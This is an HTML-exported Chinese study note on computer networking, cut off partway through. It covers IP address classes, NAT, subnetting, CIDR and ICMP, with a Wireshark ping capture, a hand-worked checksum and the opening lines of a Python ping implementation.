style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">11011111 00000001 00000001 00000001</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>二进制对于人类来说很难记忆，所以我们将IP地址分为上面的4个部分，每个部分8位(0-255)，使用.分隔，就是点分十进制。</span></p><ul><li><span>A类IP地址 地址范围1.0.0.1-126.255.255.254（二进制表示为：00000001 00000000 00000000 00000001 - 01111110 11111111 11111111 11111110）</span></li><li><span>B类IP地址地址范围128.1.0.1-191.254.255.254（二进制表示为：10000000 00000001 00000000 00000001 - 10111111 11111110 11111111 11111110）</span></li><li><span>C类IP地址范围192.0.1.1-223.255.254.254（二进制表示为: 11000000 00000000 00000001 00000001 - 11011111 11111111 11111110 11111110）</span></li><li><span>D类IP地址范围224.0.0.1-239.255.255.254（二进制表示为：11100000 00000001 00000001 00000001 - 11101111 11111111 11111111 11111110）</span></li></ul><p><span>A类是7位，应该是0-127呀，为什么是1-126呢？因为一些规定，有些ip作为了特殊ip，不能作为A类地址的网络。</span></p><p><span>以下特殊IP需要单独记忆一下</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505183244194.png" referrerpolicy="no-referrer" alt="image-20220505183244194"></p><p><span>除去特殊ip后</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505183308568.png" referrerpolicy="no-referrer" alt="image-20220505183308568">
<span>网络号全0表示本网络</span></p><p><span>主机号全为0表示指向本网，主机号全为1表示广播地址，16777214是2^24-2，去掉全0和全1，其他同理。</span></p><p><span>私有IP也需要注意一下， 私有IP就是本地网络的IP，路由器不会转发目的地址是私有地址的数据报。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505185819077.png" referrerpolicy="no-referrer" alt="image-20220505185819077">
<span>我们平常用的大多是C类的，如果在使用电脑，可以打开命令窗口查看一下，Windows是使用ipconfig、Linux是使用ifconfig。</span></p><h4 id='网络地址转换nat'><span>网络地址转换NAT</span></h4><p><span>前面我们提到了私有IP地址，在电脑上查看到的也是私有IP，那么如何与外网通信呢？这就需要NAT。</span></p><p><span>网络地址转换NAT（Network Address Translation)：在专用网连接到因特网的路由器上安装NAT软件，安装了NAT软件的路由器叫NAT路由器，它至少有一个有效的外部全球IP地址。</span></p><p><span>以当前的网络为例，家里的WiFi，浏览器输入路由器的IP地址192.168.31.1，进入小米路由器：</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505190153343.png" referrerpolicy="no-referrer" alt="image-20220505190153343"></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505190259597.png" referrerpolicy="no-referrer" alt="image-20220505190259597"></p><ul><li><span>本地网络：192.168.31.0</span></li><li><span>路由器本地端口ip/本地网关：192.168.31.1</span></li><li><span>公网ip：110.255.250.111</span></li></ul><p><span>NAT路由器内部会维护一个NAT表，进行本地ip：端口到外部网络ip：端口的映射。例如，192.168.31.164:50001-&gt;110.255.250.111:40001，那么访问百度，就是本地数据包发给路由器，路由器转发数据包，百度响应后，发给路由器，路由器收到后再根据是局域网内的哪个设备请求的再给予分发数据包进行回应。</span></p><h4 id='子网划分与子网掩码'><span>子网划分与子网掩码</span></h4><p><span>两级IP有一些缺点：</span></p><ul><li><span>第一，IP地址空间的利用率有时很低。</span></li><li><span>第二，给每一个物理网络分配一个网络号会使路由表变得太大因而使网络性能变坏。</span></li><li><span>第三，两级IP地址不够灵活。</span></li></ul><p><span>例如，一个单位申请了一个B类地址，但是公司没有那么多台电脑，但又可能会扩充，这个时候可能会按照部门进行子网的划分，增加部门内部人员或增加部门就比较方便，此时，单位内部的网络IP可表示为：</span></p><p><span>IP地址::={&lt;网络号&gt;，&lt;子网号&gt;，&lt;主机号&gt;}</span></p><h5 id='子网划分'><span>子网划分</span></h5><p><span>下面用例子说明划分子网的概念。下图表示某单位拥有一个B类IP地址，网络地址是145.13.0.0（网络号是145.13）。目的地址为145.13.x.x的数据报都被送到这个网络上的路由器R1。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505190545764.png" referrerpolicy="no-referrer" alt="image-20220505190545764"></p><p><span>现把单位网络划分为三个子网。这里假定</span><strong><span>子网号占用8位</span></strong><span>，因此在增加了子网号后，主机号就只有8位。所划分的三个子网分别是：145.13.3.0，145.13.7.0和145.13.21.0。在划分子网后，整个网络对外部仍表现为一个网络，其网络地址仍为145.13.0.0。但网络145.13.0.0上的路由器R1在收到外来的数据报后，再根据数据报的目的地址把它转发到相应的子网。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505190612034.png" referrerpolicy="no-referrer" alt="image-20220505190612034"></p><p><span>子网可有2^8共256个，现分配了3、7、21，还可分配253个。</span></p><p><span>子网145.13.3.0可有主机共2^8-2=254个，145.3.3.1-145.3.3.9以及145.3.3.102-145.3.3.254可以分配给新来本部门的同事。其余两个子网同理。</span></p><h5 id='子网掩码'><span>子网掩码</span></h5><p><span>子网掩码，主机号部分全0，剩下全1。可用于和ip相与，判断是否属于本网络。上面的子网掩码为11111111 11111111 11111111 00000000，写成点分十进制为255.255.255.0。</span></p><p><strong><span>例题：</span></strong></p><p><span>已知IP地址是141.14.72.24，子网掩码是255.255.192.0，求网络地址。</span></p><p><span>72的二进制为01001000，192的二进制为11000000，相与后为01000000，即64，故网络地址为141.14.64.0。</span></p><p><span>主机起始ip：01110010 00001110 01000000 00000001  141.14.64.1</span></p><p><span>主机结束ip：01110010 00001110 01111111 111111110   141.14.127.254</span></p><p><strong><span>例题：</span></strong></p><p><span>某主机的IP地址为180.80.77.55，子网掩码为255.255.252.0。若该主机向其所在子网发送广播分组，则目的地址可以是（）.</span>
<span>A.180.80.76.0     B.180.80.76.255      C.180.80.77.255     D.180.80.79.255</span></p><p><strong><span>解析：</span></strong><span>77的二进制01001101，252的二进制11111100，相与后为01001100，十进制为76，广播分组为主机号全1，即第三个为01001111（79），第四个为255，所以选D。</span></p><h4 id='cidr'><span>CIDR</span></h4><p><span>CIDR(Classless Inter-Domain Routing，无类别域间路由)是一个用于给用户分配IP地址以及在互联网上有效地路由IP数据包的对IP地址进行归类的方法。</span></p><p><span>IP地址::={&lt;网络前缀&gt;，&lt;主机号&gt;}，CIDR写法为ip/网络前缀位数，例如，128.14.32.7/20。</span></p><p><span>128.14.32.7写成二进制 10000000 00001110 00100000 00000111，其中下划线加粗的20位就是网络前缀，本网络</span></p><p><span>开始地址：10000000 00001110 00100000 00000000  128.14.32.0</span></p><p><span>结束地址：10000000 00001110 00101111 11111111     128.14.47.255</span></p><p><span>当然，还是全0表示本网络，全1为广播地址，不能分配给主机。</span></p><h5 id='最长前缀匹配'><span>最长前缀匹配</span></h5><p><span>使用CIDR时，查找路由表可能得到几个匹配结果，应选择具有最长网络前缀的路由。前缀越长，地址块越小，路由越具体。</span></p><p><strong><span>例题：</span></strong></p><p><span>路由器RO的路由表见下表：若进入路由器RO的分组的目的地址为132.19.237.5，请问该分组应该被转发到哪一个下一跳路由器（）。</span>
<span> A.R1             B.R2            C.R3             D.R4</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505191331391.png" referrerpolicy="no-referrer" alt="image-20220505191331391"></p><p><strong><span>解析：</span></strong><span>网络前缀为8位，132.19.237.5所在目的网络为132.0.0.0，</span><strong><span>匹配</span></strong><span>；网络前缀为11位，132.19.237.5(19的二进制为00010011)所在目的网络为132.0.0.0，</span><strong><span>匹配</span></strong><span>；网络前缀为2位，132.19.237.5(237的二进制为11101101)所在目的网络为132.19.236.0，</span><strong><span>不匹配</span></strong><span>。故，选择B</span></p><p><strong><span>例题：</span></strong></p><p><span>某网络的IP地址空间为192.168.5.0/24，采用定长子网划分，子网掩码为255.255.255.248，则该网络中的最大子网个数、每个子网内的最大可分配地址个数分别是（）。</span>
<span> A. 32，8                   B. 32，6                 C. 8，32                 D. 8，30</span></p><p><strong><span>解析：</span></strong><span>248的二进制为11111000，故后三位为主机号，2^3=8，由于全0和全1不可分配，故选B。选项不是很好，应该有个30 6，注意CIDR的子网是全可以用的，不用管全0和全1。</span></p><h3 id='实战-1'><span>实战</span></h3><p><span>访问：</span><a href='http://www.cxtuku.com/search.php?q=lady_killer9' target='_blank' class='url'>http://www.cxtuku.com/search.php?q=lady_killer9</a></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505192137105.png" referrerpolicy="no-referrer" alt="image-20220505192137105"></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505193122435.png" referrerpolicy="no-referrer" alt="image-20220505193122435"></p><ul><li><span>版本：0100，4，表示IPv4</span></li><li><span>首部长度：0101，5，单位4B，故首部长度20B</span></li><li><span>总长度：02f5，235，总长度235B</span></li><li><span>标志，片偏移：40，二进制为010000</span>…<span>.，DF=1，MF=0，禁止分片，后面没有分片，片偏移为0</span></li><li><span>TTL：即128s。</span></li><li><span>协议：06，即TCP，关于TCP的学习</span></li><li><span>校验和：0000</span></li><li><span>源IP：0a674ccb，二进制为 00001010 01100111 01001100 11001011，点分十进制为10.103.76.203</span></li><li><span>目的IP：3de80a81，步骤同上，IP见图</span></li></ul><h3 id='参考-1'><span>参考</span></h3><p><span>《计算机网络第七版 谢希仁》 第4.2-4.3节</span></p><p>&nbsp;</p><h2 id='icmp协议详解'><span>ICMP协议详解</span></h2><h3 id='简介-3'><span>简介</span></h3><p><span>ICMP（Internet Control Message Protocol，网际控制报文协议）是TCP/IP协议簇的一个子协议，用于在</span><strong><span>主机、路由器</span></strong><span>之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</span></p><h3 id='报文格式-2'><span>报文格式</span></h3><p><span>ICMP报文分为两类：一类通知出错原因 ，一类用于诊断查询。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505195932059.png" referrerpolicy="no-referrer" alt="image-20220505195932059"></p><ul><li><span>类型：占一字节，标识ICMP报文的类型，从类型值来看ICMP报文可以分为两大类。第一类是取值为1~127的差错报文，第2类是取值128以上的信息报文。</span></li><li><span>代码：占一字节，标识对应ICMP报文的代码，它与类型字段一起共同标识了ICMP报文的详细类型。</span></li><li><span>校验和：占两个字节，这是对包括ICMP报文数据部分在内的整个ICMP数据报的校验和，以检验报文在传输过程中是否出现了差错</span></li></ul><h4 id='差错报文'><span>差错报文</span></h4><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505200037648.png" referrerpolicy="no-referrer" alt="image-20220505200037648"></p><h5 id='常见类型-1'><span>常见类型</span></h5><ul><li><span>3    目标/终点不可达：无法交付。当路由器或主机不能交付数据报时就向源点发送终点不可达报文。</span></li><li><span>4    源点抑制</span></li><li><span>5    </span><strong><span>重定向</span></strong><span>/改变路由：更好路由。路由器把改变路由报文发送给主机，让主机知道下次应将数据报发送给另外的路由器（可通过更好的路由）。</span></li><li><span>11   </span><strong><span>超时</span></strong><span>：TTL=0。当路由器收到生存时间TTL=0的数据报时，除丢弃数据包外，还要向源点发送时间超过报文。当终点在预先规定的时间内不能收到一个数据报的全部数据报片时，就把已收到的数据报片都丢弃，并向源点发送时间超过报文。</span></li><li><span>12  参数问题：首部字段有问题。当路由器或目的主机收到的数据报的首部中有的字段的值不正确时，就丢弃该数据报，并向源点发送参数问题报文。</span></li><li><span>4已弃用</span></li></ul><h5 id='不发送icmp差错报文的情况'><span>不发送ICMP差错报文的情况</span></h5><ul><li><span>对ICMP差错报告报文不再发送ICMP差错报告报文（否则可能死循环）</span></li><li><span>对第一个分片的数据报片的所有后续数据报片都不发送ICMP差错报告报文。</span></li><li><span>目的地址是多/广播地址的数据报都不发送ICMP差错报告报文。</span></li><li><span>作为链路层广播的数据报都不发送ICMP差错报告报文。</span></li><li><span>对具有特殊地址(如127.0.0.0或0.0.0.0)的数据报不发送ICMP差错报告报文。</span></li></ul><h4 id='询问报文'><span>询问报文</span></h4><h5 id='常见类型-2'><span>常见类型</span></h5><ul><li><span>0    </span><strong><span>回送应答</span></strong><span>：收到回送请求报文的主机必须给源主机或路由器发送ICMP回送应答报文，表示本身可达以及自身状态。</span></li><li><span>8    </span><strong><span>回送请求</span></strong><span>：主机或路由器向特定目的主机发出的询问，测试目的主机是否可达以及了解其相关状态。</span></li><li><span>13  时间戳请求：请某个主机或路由器回答当前的日期和时间，用来进行时钟同步和测量时间。</span></li><li><span>14  时间戳响应：收到时间戳请求报文的主机回答当前的日期和时间，用来进行时钟同步和测量时间。</span></li><li><span>15  路由器应答</span></li><li><span>16  路由器请求</span></li><li><span>17  地址子网请求</span></li><li><span>18  地址子网应答</span></li></ul><p><strong><span>后4个已经弃用了</span></strong></p><h3 id='实战-2'><span>实战</span></h3><h5 id='简单ping命令实现'><span>简单Ping命令实现</span></h5><p><span>PING（Packet InterNet Groper）分组网间探测，用来测试两台主机之间的连通性。当然，也可能由于防火墙或具有白名单功能的路由器而无法Ping通。</span></p><h6 id='抓包-1'><span>抓包</span></h6><p><span>打开WireShark，筛选icmpv6数据报，cmd命令，ping一下 </span><a href='http://www.ynu.edu.cn' target='_blank' class='url'>www.ynu.edu.cn</a><span>。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505200659490.png" referrerpolicy="no-referrer" alt="image-20220505200659490"></p><p><span>（以上为ping云南大学官网的结果）</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505201759046.png" referrerpolicy="no-referrer" alt="image-20220505201759046"></p><p><span>(以上为回送请求报文)</span>
<span>类型：表示回送请求类型。</span>
<span>代码：0(00)。</span>
<span>校验和：0xd3ac[correct]，校验正确。</span>
<span>Identifier、Sequence number：00 01 1。</span>
<span>数据：以上图片蓝色部分</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505201928275.png" referrerpolicy="no-referrer" alt="image-20220505201928275"></p><p><span>（以上为回送应答报文）</span>
<span>类型：表示回送请求类型。</span>
<span>代码：0(00)。</span>
<span>校验和：0xd2ac[correct]，校验正确。</span>
<span>Identifier、Sequence number：0x0001 1。</span>
<span>数据：如上图蓝色阴影部分。</span>
<strong><span>综上</span></strong><span>，Ping命令测试两个主机之间的连通性，使用了ICMP发送请求和回答报文。</span></p><h6 id='手算校验和'><span>手算校验和</span></h6><p><span>ICMP报文中的各个部分中，校验和是相对较难的。先看一下如何计算。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505202426231.png" referrerpolicy="no-referrer" alt="image-20220505202426231">
<span>首先，校验和字段置为0，然后，对首部中每个16bit进行二进制反码求和，结果存在校验和字段中。</span></p><p><span>回送请求报文</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33398px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">08 00 4d 54 00 01 00 07 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 61 62 63 64 65 66 67 68 69</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>校验码置0</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33203px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">08 00 00 00 00 01 00 07 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 61 62 63 64 65 66 67 68 69</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>16bit一组</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33398px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">0800 0000 0001 0007 6162 6364 6566 6768 696a 6b6c 6d6e 6f70 7172 7374 7576 7761 6263 6465 6667 6869</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505202802174.png" referrerpolicy="no-referrer" alt="image-20220505202802174"></p><p><span>按列计算，右侧第一列加和结果为7(111)，剩1，进11，右侧第二列加和结果为9+1（进位）=10(1010)，剩0进101。同理，最后将超出16位部分加和，结果回加到低位，得到求和结果，取反得到校验和。不习惯按列加的可以两两相加（待加个数超过16个时没有按列快，因为按列总是16列)，以下代码使用的是</span><strong><span>两两加和</span></strong><span>。</span></p><h6 id='实现ping的全部代码python）'><span>实现ping的全部代码（python）</span></h6><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="python" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 53px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 45px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>132</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -45px; width: 45px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">"""</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">--coding:utf-8--</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">@File: Ping.py</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">@Author:frank yu</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">@DateTime: 2020.12.13 10:35</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">@Contact: frankyu112058@gmail.com</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">@Description:Implement of Ping</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">"""</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">random</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">socket</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">struct</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">time</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">def</span> <span class="cm-def">checksum</span>(<span class="cm-variable">msg</span>):</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">"""</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :param msg:icmp message(bytes)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  :return:checksum(bytes)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string"> &nbsp;  """</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span 